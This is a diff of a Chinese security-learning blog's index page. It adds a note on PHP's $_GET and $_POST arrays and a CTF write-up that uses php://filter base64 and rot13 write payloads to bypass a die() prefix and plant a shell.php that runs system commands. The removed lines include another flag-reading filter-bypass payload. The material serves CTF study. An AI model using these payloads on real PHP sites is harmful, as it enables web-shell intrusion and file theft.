@@ -73,6 +73,144 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-GET与POST数组相关知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="article-date">
+  <time class="dt-published" datetime="2025-04-25T09:06:49.000Z" itemprop="datePublished">2025-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在PHP中，<code>$_GET</code> 和 <code>$_POST</code> 是两种独立的超全局数组，它们的参数来源和处理逻辑有本质区别：</p>
+<h2 id="GET-的底层逻辑"><a href="#GET-的底层逻辑" class="headerlink" title="$_GET 的底层逻辑"></a><code>$_GET</code> 的底层逻辑</h2><ul>
+<li><strong>参数来源</strong>：<strong>URL查询字符串</strong>（如 <code>?key1=value1&amp;key2=value2</code>）。</li>
+<li><strong>无关请求方法</strong>：无论请求是 <code>GET</code>、<code>POST</code> 还是其他方法，只要URL中存在查询字符串，PHP都会自动解析到 <code>$_GET</code> 数组中。</li>
+</ul>
+<h2 id="POST-的底层逻辑"><a href="#POST-的底层逻辑" class="headerlink" title="$_POST 的底层逻辑"></a><strong><code>$_POST</code> 的底层逻辑</strong></h2><ul>
+<li><strong>参数来源</strong>：<strong>请求体（Body）</strong>，且仅当请求头的 <code>Content-Type</code> 是 <code>application/x-www-form-urlencoded</code> 或 <code>multipart/form-data</code> 时（如表单提交）。</li>
+<li><strong>依赖请求方法</strong>：只有使用 <code>POST</code> 方法时，PHP才会自动解析请求体到 <code>$_POST</code> 数组。</li>
+<li><strong>注意</strong>：如果要在 Burp Suite 中将 GET 请求修改为 POST 请求并修改请求体，请在修改完请求行的 <code>GET</code> 后在右侧 Inspector 内修改请求体，否则 Burp Suite 不会自动向请求头中添加 <code>Content-Type</code> 字段，导致参数无法传给 <code>$_POST</code> 数组。</li>
+</ul>
+<p>由此可得：只要 URL 中存在查询字符串，都会被解析到 <code>$_GET</code> 数组；但 <code>$_POST</code> 数组要求更严，条件不满足时会有参数无法传到 <code>$_POST</code> 数组中的情况。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cm9wms3l30001kcuh3jm8bbze" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-filter伪协议绕过die（Web87）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2025-04-25T06:02:10.000Z" itemprop="datePublished">2025-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter 伪协议绕过 die（Web87）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这道题不能再用条件竞争了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单说说题目：</p>
+<p>该题会将 <code>$_GET</code> 数组中的 <code>file</code> 参数 URL 解码，然后以解码后的 <code>file</code> 参数作为文件路径&#x2F;文件名，生成一个内容由字符串 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 与 <code>$_POST</code> 数组中的 <code>content</code> 参数的值拼接而成的文件。</p>
+<p><code>urldecode()</code>：URL 解码。</p>
+<p><code>file_put_contents()</code>：为文件写入内容，默认覆盖写。</p>
+<p>由于会 URL 解码，所以前面的一串过滤都可以简单绕过。但有 <code>die()</code> 函数，会立刻停止脚本，所以要想办法阻碍该函数执行。</p>
+<h2 id="解法一：Base64"><a href="#解法一：Base64" class="headerlink" title="解法一：Base64"></a>解法一：Base64</h2><p>可以用 <code>php://filter</code> 伪协议，使写入文件时内容经过 Base64 解码，同时在 <code>content</code> 参数中传入 Base64 编码后的 Payload 以达到绕过 <code>die()</code> 函数、执行恶意代码的目的（ 原本正常的 <code>die()</code> 函数被解码为乱码）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>由于有 <code>urldecode()</code> 函数，所以可以对 Payload 进行 URL 转码以绕过过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%77%72%69%74%65%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%73%68%65%6C%6C%2E%70%68%70</span><br></pre></td></tr></table></figure>
+
+<p>此处简单粗暴全部转码。另外， <code>file</code> 参数通过 URL 传参到服务器时，会被 URL 解码，为了使 Payload 不要过早暴露被过滤，进行第二次转码（依旧简单粗暴）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
+
+<p>另外， <code>content</code> 参数也要转码为 Base64 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt; （跳过前面的 ls ，直接演示最后一步了）</span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>用 Burp Suite 抓包，将 <code>GET</code> 改为 <code>POST</code> ，修改 URL 参数，然后修改请求体。</p>
+<p>由于 Base64 的处理特性（详情请自行查找）， <code>content</code> 要加两个字符（这里用 <code>aa</code> ）以保证转码后恶意代码正常：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>最后发包并访问 <code>/shell.php</code> 即可。</p>
+<h2 id="解法二：ROT13"><a href="#解法二：ROT13" class="headerlink" title="解法二：ROT13"></a>解法二：ROT13</h2><p>与 Base64 原理相同，也是将编码处理后的 Payload 进行解码再写入文件，同时使 <code>die()</code> 函数无效化。</p>
+<p>ROT13 用同一套算法既可以编码又可以解码。以下为 Payload ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>二次 URL 编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
+
+<p> <code>content</code> 参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt;</span><br><span class="line">&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓包与修改同上，但不用加什么字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后发包并访问 <code>/shell.php</code> 即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cm9wms3ld000ikcuhdrhj39l8" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-条件竞争变体题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" class="article-date">
@@ -122,7 +260,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cm9wk5w6p001ot0uhgvfnbui2" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cm9wms3lr0031kcuhgaqbcq7b" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -306,10 +444,9 @@
 <ul>
 <li>类型: 字典、元组列表、字符串、字节流</li>
 <li>作用: 发送表单数据（<code>application/x-www-form-urlencoded</code> ，默认的表单编码格式，适用于提交简单的文本数据）。</li>
-<li>注意：相比使用使用 <code>json</code> ，使用 <code>data</code> 时需手动设置 <code>Content-Type</code> 。</li>
 <li>示例:</li>
 </ul>
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125; <span class="comment"># 字典类型</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>), (<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>), (<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>)] <span class="comment"># 元组列表类型，适用于需要处理多个同名字段或对数据顺序有要求的情况。传参到服务端会把同名参数的值以类似 &quot;fruit&quot;:[&quot;apple&quot;,&quot;banana&quot;] 这样的形式存放。</span></span><br><span class="line">data = <span class="string">&#x27;name=Bob&amp;age=30&#x27;</span> <span class="comment"># 用于传输 URL 编码后的字符串</span></span><br></pre></td></tr></table></figure>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125; <span class="comment"># 字典类型</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>), (<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>), (<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>)] <span class="comment"># 元组列表类型，适用于需要处理多个同名字段或对数据顺序有要求的情况。传参到服务端会把同名参数的值以类似 &quot;fruit&quot;:[&quot;apple&quot;,&quot;banana&quot;] 这样的形式存放。</span></span><br><span class="line">data = <span class="string">&#x27;name=Bob&amp;age=30&#x27;</span> <span class="comment"># 用于传输 URL 编码后的字符串</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>json</code> 参数:</p>
 <ul>
@@ -463,7 +600,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cm9wk5w6f0007t0uh02yn2ys7" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cm9wms3l90007kcuh6wbbhdiu" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -548,7 +685,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cm9wk5w6e0006t0uhdopa3xh7" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cm9wms3l80006kcuh77fn7nes" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -684,7 +821,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cm9wk5w6h000dt0uh8o8sc4nk" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cm9wms3la000bkcuhg2cp17lh" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -787,7 +924,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cm9wk5w6q001tt0uha9rm08zk" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cm9wms3lr0034kcuhessf40i2" data-title="条件竞争漏洞与 Session 的文件上传进度追踪功能" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -863,7 +1000,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9wk5w6r0023t0uh54f9b4jx" data-title="终于轮到了日志注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9wms3ls0037kcuh4du4fs1z" data-title="终于轮到了日志注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -920,7 +1057,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9wk5w6g000bt0uh58xq4l9f" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9wms3ld000nkcuh7vvscbgb" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -989,182 +1126,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" data-id="cm9wk5w6o001dt0uh30fm5oap" data-title="大小写绕过" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" data-id="cm9wms3lq002skcuh3rt22fqx" data-title="大小写绕过" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-一些辨析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2025-04-15T07:32:55.790Z" itemprop="datePublished">2025-04-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/">一些辨析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="php-伪协议与-data-伪协议"><a href="#php-伪协议与-data-伪协议" class="headerlink" title="php:&#x2F;&#x2F; 伪协议与 data:&#x2F;&#x2F; 伪协议"></a>php:&#x2F;&#x2F; 伪协议与 data:&#x2F;&#x2F; 伪协议</h2><p><code>php://</code> 伪协议</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/[操作]/[过滤器链]/resource=[目标资源]</span></span><br></pre></td></tr></table></figure>
-
-<p><code>data://</code> 伪协议</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//&lt;MIME类型&gt;[;charset=&lt;编码&gt;][;base64],&lt;数据&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><p><code>php://</code> 伪协议可用于转换文件内容为 Base64 编码，使文件包含时 PHP 文件不会被解析，而是作为 Base64 文本返回前端。</p>
-</li>
-<li><p><code>data://</code> 伪协议自由度较高，可用于文件包含时执行命令。</p>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" data-id="cm9wk5w6k000rt0uh2d563et8" data-title="一些辨析" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-多层函数绕过过滤" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" class="article-date">
-  <time class="dt-published" datetime="2025-04-15T05:55:24.870Z" itemprop="datePublished">2025-04-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/">多层函数绕过过滤</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>不要被 <code>\（|\）</code>  吓住了，过滤的是中文括号。</p>
-<p>直接看 payload 吧：</p>
-<h2 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
-
-<p><strong>解析</strong>：</p>
-<ol>
-<li><p><strong><code>localeconv()</code></strong><br>返回包含本地化数字和货币格式信息的关联数组（有关各种货币相关符号与货币数据格式，有兴趣可自行找资料看看，本处只涉及小数点），**该数组的第一个元素通常是小数点<code>.</code>**（如<code>[&#39;.&#39;, ...]</code>），被我们借来表示当前目录。</p>
-</li>
-<li><p><strong><code>pos()</code></strong><br>**别名<code>current()</code>**，返回数组内部指针当前位置的值。PHP数组有一个隐藏的 <strong>“内部指针”<strong>，</strong>初始指向第一个元素</strong>。此处指向 <code>localeconv()</code> 生成数组中的第一个元素 <code>.</code> ，用于表示当前目录（ Linux 知识点）。</p>
-</li>
-<li><p><strong><code>scandir(&#39;.&#39;)</code></strong><br>扫描当前目录，返回按升序排列的文件列表，例如：<code>[&#39;.&#39;, &#39;..&#39;, &#39;flag.php&#39;, &#39;index.php&#39;]</code>。</p>
-</li>
-<li><p><strong><code>array_reverse()</code></strong><br>反转数组顺序，得到：<code>[&#39;index.php&#39;, &#39;flag.php&#39;, &#39;..&#39;, &#39;.&#39;]</code>。</p>
-</li>
-<li><p><strong><code>next()</code></strong><br>将数组内部指针从第一个元素（<code>index.php</code>）后移一位，返回第二个元素<code>flag.php</code>。<br>关于数组指针操作函数，参考以下表格。<br><strong>数组指针操作函数返回值规则</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">是否移动指针</th>
-<th align="left">返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>current()</code> &#x2F; <code>pos()</code></td>
-<td align="left">否</td>
-<td align="left">当前指针位置的值（越界返回 <code>false</code>）</td>
-</tr>
-<tr>
-<td align="left"><code>next()</code></td>
-<td align="left">是（后移）</td>
